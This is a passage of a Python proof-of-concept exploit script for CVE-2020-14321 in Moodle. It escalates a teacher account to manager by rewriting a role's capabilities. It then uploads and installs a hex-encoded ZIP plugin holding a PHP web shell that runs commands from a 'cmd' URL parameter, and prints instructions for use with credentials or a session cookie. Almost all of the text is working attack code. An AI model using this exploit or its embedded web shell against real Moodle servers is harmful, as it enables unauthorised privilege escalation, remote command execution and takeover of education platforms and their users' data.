2Fseb%3Amanage_seb_filterembeddedcontent=1&quizaccess%2Fseb%3Amanage_seb_linkquitseb=1&quizaccess%2Fseb%3Amanage_seb_muteonstartup=1&quizaccess%2Fseb%3Amanage_seb_quitpassword=1&quizaccess%2Fseb%3Amanage_seb_regexallowed=1&quizaccess%2Fseb%3Amanage_seb_regexblocked=1&quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=1&quizaccess%2Fseb%3Amanage_seb_showkeyboardlayout=1&quizaccess%2Fseb%3Amanage_seb_showreloadbutton=1&quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=1&quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=1&quizaccess%2Fseb%3Amanage_seb_showtime=1&quizaccess%2Fseb%3Amanage_seb_showwificontrol=1&quizaccess%2Fseb%3Amanage_seb_templateid=1&quizaccess%2Fseb%3Amanage_seb_userconfirmquit=1&repository%2Fareafiles%3Aview=1&repository%2Fboxnet%3Aview=1&repository%2Fcontentbank%3Aview=1&repository%2Fcoursefiles%3Aview=1&repository%2Fdropbox%3Aview=1&repository%2Fequella%3Aview=1&repository%2Ffilesystem%3Aview=1&repository%2Fflickr%3Aview=1&repository%2Fflickr_public%3Aview=1&repository%2Fgoogledocs%3Aview=1&repository%2Flocal%3Aview=1&repository%2Fmerlot%3Aview=0&repository%2Fnextcloud%3Aview=1&repository%2Fonedrive%3Aview=1&repository%2Fpicasa%3Aview=1&repository%2Frecent%3Aview=1&repository%2Fs3%3Aview=1&repository%2Fskydrive%3Aview=1&repository%2Fupload%3Aview=1&repository%2Furl%3Aview=1&repository%2Fuser%3Aview=1&repository%2Fwebdav%3Aview=1&repository%2Fwikimedia%3Aview=1&repository%2Fyoutube%3Aview=1&block%2Factivity_modules%3Aaddinstance=1&block%2Factivity_results%3Aaddinstance=1&block%2Fadmin_bookmarks%3Aaddinstance=1&block%2Fbadges%3Aaddinstance=1&block%2Fblog_menu%3Aaddinstance=1&block%2Fblog_recent%3Aaddinstance=1&block%2Fblog_tags%3Aaddinstance=1&block%2Fcalendar_month%3Aaddinstance=1&block%2Fcalendar_upcoming%3Aaddinstance=1&block%2Fcomments%3Aaddinstance=1&block%2Fcompletionstatus%3Aaddinstance=1&block%2Fcourse_list%3Aaddinstance=1&block%2Fcourse_summary%3Aaddinstance=1&block%2Ffeedback%3Aaddinstance=1&block%2Fglobalsearch%3Aaddinstance=1&block%2Fglossary_random%3Aaddinstance=1&block%2Fhtml%3Aaddinstance=1&block%2Flogin%3Aaddinstance=1&block%2Fmentees%3Aaddinstance=1&block%2Fmnet_hosts%3Aaddinstance=1&block%2Fmyprofile%3Aaddinstance=1&block%2Fnavigation%3Aaddinstance=1&block%2Fnews_items%3Aaddinstance=1&block%2Fonline_users%3Aaddinstance=1&block%2Fonline_users%3Aviewlist=1&block%2Fprivate_files%3Aaddinstance=1&block%2Fquiz_results%3Aaddinstance=1&block%2Frecent_activity%3Aaddinstance=1&block%2Frss_client%3Aaddinstance=1&block%2Frss_client%3Amanageanyfeeds=1&block%2Frss_client%3Amanageownfeeds=1&block%2Fsearch_forums%3Aaddinstance=1&block%2Fsection_links%3Aaddinstance=1&block%2Fselfcompletion%3Aaddinstance=1&block%2Fsettings%3Aaddinstance=1&block%2Fsite_main_menu%3Aaddinstance=1&block%2Fsocial_activities%3Aaddinstance=1&block%2Ftag_flickr%3Aaddinstance=1&block%2Ftag_youtube%3Aaddinstance=1&block%2Ftags%3Aaddinstance=1&moodle%2Fblock%3Aedit=1&moodle%2Fblock%3Aview=1&moodle%2Fsite%3Amanageblocks=1&savechanges=Save+changes"""
        sess.post(url + '/admin/roles/define.php?action=edit&roleid=1', data=data,headers=headers,proxies=proxies)
        # now check install plugin
        r=sess.get(url+"/admin/search.php")
        if "Install plugins" not in r.text:
            print("[-] Maybe this function was disabled!")
            sys.exit(1)
        print("[+] Maybe RCE via install plugins!")
        # now turn it into RCE


def RCE(url,sess,command):
    r = sess.get(url + '/admin/tool/installaddon/index.php',proxies=proxies)
    new_sess_key=re.findall(r'"sesskey":"(.*?)"', r.text)[0]
    itemid =re.findall(r'itemid=(\d*)', r.text)[0]
    #print(itemid)
    client_id = re.findall(r'"client_id":"(.*?)"', r.text)[0]
    #print(client_id)
    url_upload =url+"/repository/repository_ajax.php?action=upload"
    filename="rce.zip"
    hex_file="504b03040a0000000000e55ad150000000000000000000000000040000007263652f504b03040a0000000000804ed150000000000000000000000000090000007263652f6c616e672f504b03040a0000000000766dd1500000000000000000000000000c0000007263652f6c616e672f656e2f504b0304140000000800f85bd15003d31496200000001e000000190000007263652f6c616e672f656e2f626c6f636b5f7263652e706870b3b12fc8285028ae2c2e49cdd5508977770d89564fce4d518fd5b456b0b70300504b03041400000008007a6dd150b57c6f6f41000000490000000f0000007263652f76657273696f6e2e706870b3b12fc82850e0e55229c8294dcfccd3b52b4b2d2acecccf53b05530323032303033343730b046924fcecf2dc8cf4bcd2b01aa504fcac94fce8e2f4a4e55b70600504b01021f000a0000000000e55ad1500000000000000000000000000400240000000000000010000000000000007263652f0a00200000000000010018007fd9b0025f44d6016442f41f5f44d60186f4f31f5f44d601504b01021f000a0000000000804ed1500000000000000000000000000900240000000000000010000000220000007263652f6c616e672f0a0020000000000001001800ac4de6455244d6018e1bf41f5f44d60186f4f31f5f44d601504b01021f000a0000000000766dd1500000000000000000000000000c00240000000000000010000000490000007263652f6c616e672f656e2f0a0020000000000001001800c21c21a67244d601c21c21a67244d6018e1bf41f5f44d601504b01021f00140000000800f85bd15003d31496200000001e0000001900240000000000000020000000730000007263652f6c616e672f656e2f626c6f636b5f7263652e7068700a0020000000000001001800d6dd2c376044d601d6dd2c376044d601f62dea2f5f44d601504b01021f001400000008007a6dd150b57c6f6f41000000490000000f00240000000000000020000000ca0000007263652f76657273696f6e2e7068700a0020000000000001001800ee9edaa97244d601ee9edaa97244d6016442f41f5f44d601504b05060000000005000500db010000380100000000"
    file=binascii.unhexlify(hex_file)
    files = {
        'repo_upload_file': (filename, file, 'application/octet-stream'),
        'title': (None, ''),
        "author":(None,"Something"),
        "license":(None,"unknown"),
        "itemid":(None,itemid),
        "accepted_types[]":(None,".zip"),
        "repo_id":(None,"5"),
        "p":(None,""),
        "page":(None,""),
        "env":(None,"filepicker"),
        "sesskey" : (None,new_sess_key),
        "client_id" :(None,client_id),
        "maxbytes" : (None,"-1"),
        "areamaxbytes" :(None,"-1"),
        "ctx_id" : (None,"1"),
        "savepath" :(None, "/")
    }
    r=sess.post(url_upload, files=files,proxies=proxies)
    if "error" in r.text:
        print("[-] Error when uploading this file, try again!")
        sys.exit(1)
    # install zip file
    new_url=url+"/admin/tool/installaddon/index.php"
    data={
        "sesskey" : new_sess_key,
        "_qf__tool_installaddon_installfromzip_form" : "1",
        "mform_showmore_id_general" : "0",
        "mform_isexpanded_id_general" : "1",
        "zipfile" : itemid,
        "plugintype" : "",
        "rootdir" : "",
        "submitbutton" : "Install plugin from the ZIP file"
        }
    r=sess.post(new_url, data=data,proxies=proxies)
    if "Validation successful" not in r.text:
        print("[-] Error when validing this file, try again!")
        sys.exit(1)
    # Confirm load
    zip_storage = re.findall(r'installzipstorage=(.*?)&', r.url)[0]
    data = {
        "installzipcomponent" : "block_rce",
        "installzipstorage" : zip_storage,
        "installzipconfirm" : "1",
        "sesskey" : new_sess_key
    }

    r = sess.post(url + '/admin/tool/installaddon/index.php', data=data)
    if "Current release information" not in r.text:
        print("[-] Error when confirming this file, try again!")
        sys.exit(1)
    # Done, now trigger RCE
    print("[+] Checking RCE ...")
    link_rce=url+"/blocks/rce/lang/en/block_rce.php?cmd="+command
    r=sess.get(link_rce,proxies=proxies)
    print("[+] RCE link in here:\n"+link_rce)
    print(r.text)


def main():
    print("""                           ***CVE 2020 14321*** 
    How to use this PoC script
    Case 1. If you have vaid credentials:
    python3 cve202014321.py -u http://test.local:8080 -u teacher -p 1234 -cmd=dir
    Case 2. If you have valid cookie:
    python3 cve202014321.py -u http://test.local:8080 -cookie=37ov37abn9kv22gj7enred9bl7 -cmd=dir
    """)
    # Construct the argument parser
    ap = argparse.ArgumentParser()
    # Add the arguments to the parser
    ap.add_argument("-url", "--url", required=True,
                    help=" URL for your Joomla target")
    ap.add_argument("-u", "--username",
                    help="username")
    ap.add_argument("-p", "--password",
                    help="password")
    ap.add_argument("-cookie", "--cookie",
                    help="cookie")
    ap.add_argument("-cmd", "--command", default="whoami",
                    help="command")
    args = vars(ap.parse_args())
    # target
    url = format(str(args['url']))
    print ('[+] Your target: ' + url)
    # username
    uname = format(str(args['username']))
    # password
    upass = format(str(args['password']))
    #cookie
    cookie=format(str(args['cookie']))
    # command
    command = format(str(args['command']))
    # session
    sess=try_teacher_login(url,uname,upass,cookie)
    privilegeEscalationToManagerCourse(url,sess)
    RCE(url,sess,command)

if __name__ == "__main__":
    sys.exit(main())
